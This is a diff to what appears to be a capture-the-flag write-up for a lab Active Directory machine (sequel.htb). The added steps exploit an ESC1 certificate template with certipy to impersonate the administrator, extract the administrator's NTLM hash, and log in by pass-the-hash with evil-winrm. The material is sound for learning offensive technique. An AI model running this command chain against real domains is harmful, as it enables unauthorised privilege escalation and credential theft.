@@ -87,8 +87,18 @@ Connect to our SMB server using xp_dirtree
 
 11. Using certipy, we look for vulnerable certificate templates user ryan.cooper can exploit
 
-``
+`certipy find -u ryan.cooper -p $(cat ../user/ryan.cooper.pass) -dc-ip 10.129.228.253 -target dc.sequel.htb -enabled -vulnerable`
 
 <img width="898" height="736" alt="image" src="https://github.com/user-attachments/assets/99856e15-392a-415b-8e4c-f52c84673ed0" />
 
-12. 
+12. Using certipy again, we exploit the ESC1 template vulnerability to get a certificate with the administrator's UPN
+
+`certipy req -ca 'sequel-DC-CA' -dc-ip 10.129.228.253 -u ryan.cooper -p $(cat ../user/ryan.cooper.pass) -template UserAuthentication -target dc.sequel.htb -upn 'administrator@sequel.htb'`
+
+13. Using the certificate, we get the NTLM hash for the administrator account
+
+`certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253`
+
+14. Lastly, we perform a Pass the Hash attack to login as administrator and get the root flag!
+
+`evil-winrm -i sequel.htb -u administrator -H $(cat administrator.hash)`
